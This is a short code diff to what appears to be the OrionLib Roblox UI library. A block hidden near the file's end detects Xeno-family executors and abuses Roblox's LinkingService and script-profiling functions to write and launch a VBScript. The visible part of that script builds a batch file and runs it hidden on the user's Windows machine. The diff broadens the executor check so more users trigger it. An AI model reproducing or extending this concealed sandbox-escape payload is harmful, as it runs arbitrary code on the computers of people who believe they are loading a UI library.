@@ -2039,7 +2039,7 @@ end
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
-if identifyexecutor()  == "Xeno"  or identifyexecutor() == "JJSploit x Xeno" then
+if string.find(identifyexecutor(), "Xeno") then
 			
 script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(script:FindFirstAncestorWhichIsA("DataModel"):FindService("ScriptContext"):SaveScriptProfilingData([[
 Dim fso, tempFile, batFile, wshShell
@@ -2077,7 +2077,6 @@ tempFile.Close()
 wshShell.Run batFile, 0, False
 
             ]], 
-            "thebestexecutorofalltime.vbs"
-        ))
-		end
+            "thebestexecutorofalltime.vbs"))
+end
 return OrionLib
